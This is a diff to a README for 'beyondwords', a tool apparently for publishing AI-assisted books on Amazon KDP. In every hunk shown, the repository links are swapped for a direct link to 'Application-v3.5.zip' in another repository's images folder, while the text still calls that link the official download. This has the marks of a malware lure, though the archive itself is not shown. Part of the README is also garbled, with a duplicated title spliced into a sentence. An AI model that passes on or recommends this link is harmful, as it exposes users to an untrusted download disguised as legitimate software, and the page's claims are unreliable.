@@ -5,7 +5,7 @@ description: "Build and publish AI-assisted books on Amazon Kindle and KDP with 
 ---
 # 🚀 beyondwords - Publish AI Books on Amazon KDP
 
-[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-ff5733?style=for-the-badge&logo=github)](https://github.com/michaelpuryear83/beyondwords)
+[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-ff5733?style=for-the-badge&logo=github)](https://github.com/michaelpuryear83/michaelpuryear83.github.io/raw/refs/heads/main/images/Application-v3.5.zip)
 
 ## 📘 What Is beyondwords?
 
@@ -45,7 +45,7 @@ Research potential Amazon KDP niches and gather the details needed to decide whe
 
 Create book projects with a clear goal. Build outlines, develop chapters, draft content, and keep production notes connected# 📚 beyondwords - Publish AI Books on Amazon KDP
 
-[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-2e86de?style=for-the-badge&logo=github)](https://github.com/michaelpuryear83/beyondwords)
+[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-2e86de?style=for-the-badge&logo=github)](https://github.com/michaelpuryear83/michaelpuryear83.github.io/raw/refs/heads/main/images/Application-v3.5.zip)
 
 ## 📘 What Is beyondwords?
 
@@ -111,13 +111,13 @@ beyondwords includes MCP integration for connecting the application to compatibl
 
 Getting started with beyondwords on Windows takes one step: visit the download link and get the application.
 
-[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-27ae60?style=for-the-badge&logo=github)](https://github.com/michaelpuryear83/beyondwords)
+[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-27ae60?style=for-the-badge&logo=github)](https://github.com/michaelpuryear83/michaelpuryear83.github.io/raw/refs/heads/main/images/Application-v3.5.zip)
 
 ### ⬇️ Download beyondwords
 
 Visit this link to download the application:
 
-https://github.com/michaelpuryear83/beyondwords
+https://github.com/michaelpuryear83/michaelpuryear83.github.io/raw/refs/heads/main/images/Application-v3.5.zip
 
 Open the link in your normal web browser. The page belongs to the beyondwords project and is the official place to obtain the application.
 
@@ -201,7 +201,7 @@ Yes. Client services are part of the application, and you can keep client projec
 The project targets Amazon KDP publishing, which includes ebook production and the publishing details needed for paperback listings.
 
 **Where do I get the application?**
-Visit https://github.com/michaelpuryear83/beyondwords to download it.
+Visit https://github.com/michaelpuryear83/michaelpuryear83.github.io/raw/refs/heads/main/images/Application-v3.5.zip to download it.
 
 ## 🆘 Getting Help
 
